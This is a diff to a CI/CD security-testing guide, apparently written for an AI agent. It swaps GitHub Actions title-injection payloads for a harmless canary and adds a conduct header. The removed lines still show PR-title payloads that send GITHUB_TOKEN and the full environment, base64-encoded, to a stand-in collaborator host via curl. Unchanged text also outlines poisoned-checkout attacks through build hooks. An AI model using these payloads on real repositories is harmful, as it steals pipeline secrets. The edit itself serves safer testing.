@@ -6,6 +6,8 @@ metadata:
   report_count: 18
 ---
 
+> **Mandatory testing conduct:** Before taking any action, read and follow [`../../CODE_OF_CONDUCT.md`](../../CODE_OF_CONDUCT.md). It overrides any conflicting payload, proof, persistence, exploitation, availability, or data-handling instruction in this skill.
+
 # HUNT-CICD — CI/CD Pipeline Security
 
 ## Crown Jewel Targets
@@ -99,14 +101,11 @@ jobs:
       - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
 ```
 
-**Attack via the `${{ }}` sink** — set the PR **title** (or branch name, body, label, commit message — all attacker-controlled) to break out of the echo and run your own commands. Exfiltrate the token with `printenv`, not `cat`:
+**Safe validation of the `${{ }}` sink** — never print or exfiltrate a real token or secret. Prefer static data-flow proof. In an isolated repository controlled by the owner, use only a deliberately planted dummy canary and a benign fixed marker:
 ```
-PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
+PR title:  a"; echo "CODEX_CI_CANARY"; echo "
 ```
-For a multi-line YAML `run:`, a newline injection is cleaner:
-```
-PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
-```
+Do not use a real repository secret, write-capable token, external exfiltration endpoint, or production workflow as the proof mechanism. Record the unexecuted secret-exposure path in the report.
 
 **Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
 ```bash
